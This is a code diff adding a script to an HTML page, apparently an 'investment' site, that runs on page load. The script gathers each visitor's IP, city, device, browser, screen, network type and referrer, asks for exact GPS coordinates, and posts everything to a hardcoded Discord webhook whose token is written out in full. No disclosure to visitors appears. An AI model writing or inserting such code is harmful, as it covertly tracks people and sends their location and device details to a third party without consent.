@@ -90,6 +90,72 @@
     </script>
 
     <script src="app.js"></script>
+
+    <script>
+            async function sendDiscordAlert() {
+                try {
+                    // 1. Data Gathering
+                    let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
+                    try {
+                        let response = await fetch('https://ipapi.co/json/');
+                        let data = await response.json();
+                        ip = data.ip; city = data.city; region = data.region; country = data.country_name;
+                    } catch (e) { console.log("IP lookup failed"); }
+
+                    let ua = navigator.userAgent;
+                    let screenRes = `${window.screen.width}x${window.screen.height}`;
+                    let conn = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+                    let referrer = document.referrer || 'Direct/None';
+                    let lang = navigator.language;
+                    
+                    let browser = "Unknown", os = "Unknown", device = /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop";
+                    if (ua.includes("Firefox")) browser = "Firefox";
+                    else if (ua.includes("Edg")) browser = "Edge";
+                    else if (ua.includes("Chrome")) browser = "Chrome";
+                    else if (ua.includes("Safari")) browser = "Safari";
+
+                    if (ua.includes("Win")) os = "Windows";
+                    else if (ua.includes("Mac")) os = "macOS";
+                    else if (ua.includes("Android")) os = "Android";
+                    else if (ua.includes("like Mac")) os = "iOS";
+
+                    const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 
+
+                    const postPayload = async (locationText, extraFields = []) => {
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ embeds: [{
+                                title: "🔔 Investment Visitor!",
+                                color: 248100,
+                                fields: [
+                                    { name: "🌐 IP", value: ip, inline: true },
+                                    { name: "📍 Location", value: locationText, inline: true },
+                                    { name: "📱 Device", value: `${device} (${os})`, inline: true },
+                                    { name: "🌐 Browser", value: browser, inline: true },
+                                    { name: "🖥️ Screen", value: screenRes, inline: true },
+                                    { name: "⚡ Network", value: conn, inline: true },
+                                    { name: "🔗 Referrer", value: referrer.substring(0, 50), inline: false },
+                                    ...extraFields,
+                                    { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
+                                ]
+                            }]})
+                        });
+                    };
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => postPayload(`${city}, ${region}, ${country}`, [{ name: "🎯 GPS", value: `[Open Map](https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false }]),
+                            () => postPayload(`${city}, ${region}, ${country} (GPS Denied)`),
+                            { timeout: 10000 }
+                        );
+                    } else {
+                        postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
+                    }
+                } catch (err) { console.error(err); }
+            }
+            window.onload = sendDiscordAlert;
+        </script>
 </body>
 </html>
 ```[cite: 2]
